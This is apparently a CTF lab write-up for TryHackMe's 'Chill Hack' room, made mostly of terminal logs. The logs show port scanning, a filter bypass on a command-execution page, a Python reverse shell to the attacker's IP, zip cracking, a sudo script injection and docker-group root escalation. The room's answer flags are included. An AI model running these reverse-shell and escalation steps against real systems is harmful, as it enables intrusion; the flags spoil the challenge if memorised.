Chill the Hack out of the Machine.

Easy level CTF.  Capture the flags and have fun!

![](https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png)



```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.207.86 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.207.86:21
Open 10.10.207.86:22
Open 10.10.207.86:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 11:35 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Initiating Ping Scan at 11:35
Scanning 10.10.207.86 [2 ports]
Completed Ping Scan at 11:35, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:35
Completed Parallel DNS resolution of 1 host. at 11:35, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:35
Scanning 10.10.207.86 [3 ports]
Discovered open port 22/tcp on 10.10.207.86
Discovered open port 21/tcp on 10.10.207.86
Discovered open port 80/tcp on 10.10.207.86
Completed Connect Scan at 11:35, 0.25s elapsed (3 total ports)
Initiating Service scan at 11:35
Scanning 3 services on 10.10.207.86
Completed Service scan at 11:35, 6.45s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.207.86.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:35
NSE: [ftp-bounce 10.10.207.86:21] PORT response: 500 Illegal PORT command.
Completed NSE at 11:35, 6.57s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 2.57s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Nmap scan report for 10.10.207.86
Host is up, received syn-ack (0.31s latency).
Scanned at 2022-09-19 11:35:28 EDT for 16s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcxgJ3GDCJNTr2pG/lKpGexQ+zhCKUcUL0hjhsy6TLZsUE89P0ZmOoQrLQojvJD0RpfkUkDfd7ut4//Q0Gqzhbiak3AIOqEHVBIVcoINja1TIVq2v3mB6K2f+sZZXgYcpSQriwN+mKgIfrKYyoG7iLWZs92jsUEZVj7sHteOq9UNnyRN4+4FvDhI/8QoOQ19IMszrbpxQV3GQK44xyb9Fhf/Enzz6cSC4D9DHx+/Y1Ky+AFf0A9EIHk+FhU0nuxBdA3ceSTyu8ohV/ltE2SalQXROO70LMoCd5CQDx4o1JGYzny2SHWdKsOUUAkxkEIeEVXqa2pehJwqs0IEuC04sv
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFetPKgbta+pfgqdGTnzyD76mw/9vbSq3DqgpxPVGYlTKc5MI9PmPtkZ8SmvNvtoOp0uzqsfe71S47TXIIiQNxQ=
|   256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHq62Lw0h1xzNV41zO3BsfpOiBI3uy0XHtt6TOMHBhZ
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Game Info
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds

                                                                                          
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.207.86      
Connected to 10.10.207.86.
220 (vsFTPd 3.0.3)
Name (10.10.207.86:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||11202|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> more note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar

┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://10.10.207.86 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.207.86
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest

found /secret where execute commands but ls,cat,more, less is not permitted

so

use xxd to read and echo * instead of ls

like this
┌──(kali㉿kali)-[~]
└─$ xxd ftp_flag.txt                                        
00000000: 5448 4d7b 3332 3134 3532 3636 3730 3938  THM{321452667098
00000010: 7d0a                                     }.
                                                                                          
┌──(kali㉿kali)-[~]
└─$ echo *                                        
armitage-tmp asm book.txt clinic.lst cred_harv crunch.txt Desktop dict2.lst dict.lst Documents Downloads ftp_flag.txt hashctf2 IDS_IPS_evasion multi_launcher Music obfus payloads Pictures powercat PowerLessShell Public sam.bak sandox_learning share snmpcheck stager2.bat Sublist3r system.bak Templates usernames-list.txt Videos

now rev shell  \ to scape python

p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.1.77",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.207.86.
Ncat: Connection from 10.10.207.86:46208.
www-data@ubuntu:/var/www/html/secret$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/secret$ ll                           
ll
ll: command not found
www-data@ubuntu:/var/www/html/secret$ cd ..
cd ..
www-data@ubuntu:/var/www/html$ ls
ls
about.html    contact.php  images      news.html    single-blog.html
blog.html     css          index.html  preview_img  style.css
contact.html  fonts        js          secret       team.html
www-data@ubuntu:/var/www/html$ cd secret
cd secret
www-data@ubuntu:/var/www/html/secret$ ls
ls
images  index.php
www-data@ubuntu:/var/www/html/secret$ cat index.php
cat index.php
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<?php
        if(isset($_POST['command']))
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
                {
                        for($j=0; $j<count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
                                {?>
                                        <h1 style="color:red;">Are you a hacker?</h1>
                                        <style>
                                                body
                                                {
                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
                                                        background-position: center center;
                                                        background-repeat: no-repeat;
                                                        background-attachment: fixed;
                                                        background-size: cover;
        }
                                        </style>
<?php                                    return;
                                }
                        }
                }
                ?><h2 style="color:blue;"><?php echo shell_exec($cmd);?></h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        <?php }
?>
</body>
</html>
www-data@ubuntu:/var/www/html/secret$ cd ..
cd ..
www-data@ubuntu:/var/www/html$ cd ..
cd ..
www-data@ubuntu:/var/www$ ls
ls
files  html
www-data@ubuntu:/var/www$ cd files
cd files
www-data@ubuntu:/var/www/files$ ls
ls
account.php  hacker.php  images  index.php  style.css
www-data@ubuntu:/var/www/files$ cat hacker.php
cat hacker.php
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
www-data@ubuntu:/var/www/files$ cd images
cd images
www-data@ubuntu:/var/www/files/images$ ls
ls
002d7e638fb463fb7a266f5ffc7ac47d.gif  hacker-with-laptop_23-2147985341.jpg



to download an image

www-data@ubuntu:/var/www/files/images$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.18.1.77 - - [19/Sep/2022 16:10:53] "GET /hacker-with-laptop_23-2147985341.jpg HTTP/1.1" 200 -


──(kali㉿kali)-[~/chill_hack]
└─$ wget http://10.10.207.86:8000/hacker-with-laptop_23-2147985341.jpg 
--2022-09-19 12:10:52--  http://10.10.207.86:8000/hacker-with-laptop_23-2147985341.jpg
Connecting to 10.10.207.86:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68841 (67K) [image/jpeg]
Saving to: ‘hacker-with-laptop_23-2147985341.jpg’

hacker-with-laptop_23- 100%[==========================>]  67.23K  22.5KB/s    in 3.0s    

2022-09-19 12:10:56 (22.5 KB/s) - ‘hacker-with-laptop_23-2147985341.jpg’ saved [68841/68841]

                                                                                          
┌──(kali㉿kali)-[~/chill_hack]
└─$ ls
hacker-with-laptop_23-2147985341.jpg


┌──(kali㉿kali)-[~/chill_hack]
└─$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
                                                                                          
┌──(kali㉿kali)-[~/chill_hack]
└─$ ls
backup.zip  hacker-with-laptop_23-2147985341.jpg
                                                                                          
┌──(kali㉿kali)-[~/chill_hack]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password

need to crack 

┌──(kali㉿kali)-[~/chill_hack]
└─$ zip2john backup.zip > backup.hash                                   
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
                                                                                          
┌──(kali㉿kali)-[~/chill_hack]
└─$ ls
backup.hash  backup.zip  hacker-with-laptop_23-2147985341.jpg
                                                                                          
┌──(kali㉿kali)-[~/chill_hack]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2022-09-19 12:15) 25.00g/s 409600p/s 409600c/s 409600C/s total90..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                          
┌──(kali㉿kali)-[~/chill_hack]
└─$ unzip  backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php 

└─$ cat source_code.php 
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>

ssh anurodh:!d0ntKn0wmYp@ssw0rd   (from cyberchef base64decode)

┌──(kali㉿kali)-[~/chill_hack]
└─$ ssh anurodh@10.10.207.86
anurodh@10.10.207.86's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 19 16:21:15 UTC 2022

  System load:  0.24               Processes:              107
  Usage of /:   24.8% of 18.57GB   Users logged in:        0
  Memory usage: 22%                IP address for eth0:    10.10.207.86
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

anurodh@ubuntu:~$ ls
source_code.php
anurodh@ubuntu:~$ sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
anurodh@ubuntu:~$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"

executing bash file with user apaar (witty, /bin/bash )

anurodh@ubuntu:~$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: witty
Hello user! I am witty,  Please enter your message: /bin/bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
python3 -c "import pty;pty.spawn('/bin/bash')"
bash: /home/anurodh/.bashrc: Permission denied
apaar@ubuntu:~$ ls -la
ls: cannot open directory '.': Permission denied
apaar@ubuntu:~$ cd /home/apaar
apaar@ubuntu:/home/apaar$ ls -la
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
apaar@ubuntu:/home/apaar$ cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}


apaar@ubuntu:/home/apaar$ id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
apaar@ubuntu:/home/apaar$ exit
exit

^C
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
anurodh@ubuntu:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        2 years ago         5.57MB
hello-world         latest              bf756fb1ae65        2 years ago         13.3kB

gtofbins docker

anurodh@ubuntu:~$ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
[sudo] password for anurodh: 
Sorry, user anurodh is not allowed to execute '/usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh' as root on ubuntu.
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cd /root
# ls -la
total 68
drwx------  6 root root  4096 Oct  4  2020 .
drwxr-xr-x 24 root root  4096 Oct  3  2020 ..
-rw-------  1 root root     0 Oct  4  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3  2020 .cache
drwx------  3 root root  4096 Oct  3  2020 .gnupg
-rw-------  1 root root   370 Oct  4  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
drwx------  2 root root  4096 Oct  3  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
-rw-------  1 root root 11683 Oct  4  2020 .viminfo
-rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt
# cat proof.txt


{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a



```

![[Pasted image 20220919105400.png]]

User Flag
*{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}*

Root Flag
*{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}*


[[Intermediate Nmap]]